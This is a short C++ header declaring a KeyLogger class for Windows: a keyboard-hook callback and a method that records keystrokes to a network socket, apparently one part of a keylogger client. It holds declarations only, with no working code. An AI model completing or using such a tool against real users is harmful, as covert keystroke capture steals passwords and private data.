#pragma once

#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#include <thread>
#include "Client.h"

class KeyLogger
{
private:
	/*static DWORD dwTlsIndex;
	static LPVOID lpvData;*/

public:
	KeyLogger();
	~KeyLogger();

	static LRESULT CALLBACK startListen(int nCode, WPARAM wParam, LPARAM lParam);
	void recordKeyboard(SOCKET sock);
};
